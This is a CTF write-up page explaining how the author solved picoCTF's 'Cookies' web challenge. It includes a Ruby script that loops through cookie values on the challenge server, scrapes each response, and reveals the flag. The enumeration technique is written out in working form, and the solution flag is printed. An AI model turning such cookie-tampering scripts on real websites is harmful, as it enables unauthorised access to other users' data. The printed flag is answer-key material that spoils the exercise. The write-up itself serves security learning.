<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://slavetomints.github.io/writeups/style.css">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism.css" rel="stylesheet">
  <link rel="icon" type="image/x-icon" href="https://slavetomints.github.io/writeups/favicon.ico">
  <link href="https://fonts.googleapis.com/css2?family=Courier+Prime:ital,wght@0,400;0,700;1,400;1,700&display=swap" rel="stylesheet">
  <title>Cookies</title>
</head>
<body>

  <nav class="green-border" id="larger-margins">
    <h1>Slavetomints' Writeups</h1>
    <p><i>A collection of my writeups from various CTF'S</i></p>
    <ul>
      <li><a href="https://slavetomints.github.io/writeups/index.html">Home</a></li>
      <li><a href="https://slavetomints.github.io/writeups/writeups.html">Writeups</a></li>
      <li><a href="https://slavetomints.github.io/writeups/guides.html">Guides</a></li>
      <li><a href="https://slavetomints.github.io/about.html">About</a></li>
    </ul>
  </nav>

  <div class="green-border">
    <p><a href="https://slavetomints.github.io/writeups/writeups/2024/2024.html">2024</a> / <a href="https://slavetomints.github.io/writeups/writeups/2024/picoctf/picoctf.html">picoCTF</a> / <a href="https://slavetomints.github.io/writeups/writeups/2024/picoctf/web-exploitation/web-exploitation.html">Web Exploitation</a> / <a href="https://slavetomints.github.io/writeups/writeups/2024/picoctf/web-exploitation/cookies/cookies.html">Cookies</a></p>
    <md-block>
      # Cookies

      Challenge description:
      
      > Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:21485/](http://mercury.picoctf.net:21485/)
      
      Alright, so lets go check out the web page!
      
      ![the web page, all it asks for are cookies](assets/image0.png)
      
      Hm, what happens if I put in a cookie?
      
      ![the web page, after entering in snickerdoodle](assets/image1.png)
      
      Okay okay, lets look at the stored cookies
      
      ![the cookies for the web pages, theres only one and its id:0](assets/image2.png)
      
      It looks like the cookies that appears on the screen is ties to whatever number the `id` cookie is. While I could spend 15 minutes manually updating the cookie, let practice our scripting abilities. Here's the code I whipped up:
      
      ```ruby
      
      # frozen_string_literal: true
      
      require 'net/http'
      require 'nokogiri'
      require 'uri'
      
      url = URI.parse('http://mercury.picoctf.net:21485/check')
      
      http = Net::HTTP.new(url.host, url.port)
      request = Net::HTTP::Get.new(url)
      
      File.open('cookies.txt', 'w') do |file|
        (0..50).each do |num|
          request['Cookie'] = "name=#{num}"
      
          response = http.request(request)
      
          response_html = Nokogiri::HTML(response.body)
      
          target_div = response_html.at_css('div.jumbotron')
      
          if target_div
            file.write("Cookie #{num}: #{target_div.text.strip}\n")
          else
            puts 'ERROR:'
            puts "Status Code: #{response.code}"
            puts 'div not found'
          end
        end
      end
      ```
      
      Alright, lets go over this snippet of code. The first thing we do is define our requirements, which today is going to be the `net/http` and `uri` libraries, as well as the `nokogiri` gem. We'll go over what they do as we get to them.
      
      Next we use the URI library to set up the URL we want to request, which is `http://mercury.picoctf.net:21485/check`. Right after we that set up, we define a new HTTP object with the host and port from the URL we parsed earlier, and we also use the `URI` object to create a GET request. 
      
      Next we're going to open a file named `cookies.txt` to save the responses into, and since the `name` cookie only takes a number lets define a range to request from 0-50. 
      
      For each iteration, it takes the number defined in `num` and set's it to the name cookie for the request, and then we save the response from the request into the variable `response`. From the response we save the HTML into a variable named `response_html` using the `Nokogiri` gem. Since we know the response that gives the name for that cookie is in a `&lt;div&gt;` with a class named `jumbotron`, we'll only pull that out of the HTML with `at_css` from `Nokogiri`. And then we'll write in the number and the returned name into the text file if the div is present, otherwise it'll just print the status code to the terminal.
      
      Let's take a look at the content of `cookies.txt`
      
      ```
      
      Cookie 0: I love snickerdoodle cookies!
      Cookie 1: I love chocolate chip cookies!
      Cookie 2: I love oatmeal raisin cookies!
      Cookie 3: I love gingersnap cookies!
      Cookie 4: I love shortbread cookies!
      Cookie 5: I love peanut butter cookies!
      Cookie 6: I love whoopie pie cookies!
      Cookie 7: I love sugar cookies!
      Cookie 8: I love molasses cookies!
      Cookie 9: I love kiss cookies!
      Cookie 10: I love biscotti cookies!
      Cookie 11: I love butter cookies!
      Cookie 12: I love spritz cookies!
      Cookie 13: I love snowball cookies!
      Cookie 14: I love drop cookies!
      Cookie 15: I love thumbprint cookies!
      Cookie 16: I love pinwheel cookies!
      Cookie 17: I love wafer cookies!
      Cookie 18: Flag: picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}
      Cookie 19: I love macaroon cookies!
      Cookie 20: I love fortune cookies!
      Cookie 21: I love crinkle cookies!
      Cookie 22: I love icebox cookies!
      Cookie 23: I love gingerbread cookies!
      Cookie 24: I love tassie cookies!
      Cookie 25: I love lebkuchen cookies!
      Cookie 26: I love macaron cookies!
      Cookie 27: I love black and white cookies!
      Cookie 28: I love white chocolate macadamia cookies!
      ```
      
      Look at that, when `name` is set to a value of `18` we get the flag!
      
      FLAG: `picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}`      
    </md-block>
  </div>
  
  <nav class="green-border" id="larger-margins">
    <ul>
      <li><a href="https://slavetomints.github.io/writeups/index.html">Home</a></li>
      <li><a href="https://slavetomints.github.io/writeups/writeups.html">Writeups</a></li>
      <li><a href="https://slavetomints.github.io/writeups/guides.html">Guides</a></li>
      <li><a href="https://slavetomints.github.io/about.html">About</a></li>
    </ul>
  </nav>

  <script type="module" src="https://md-block.verou.me/md-block.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-ruby.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
</body>
</html>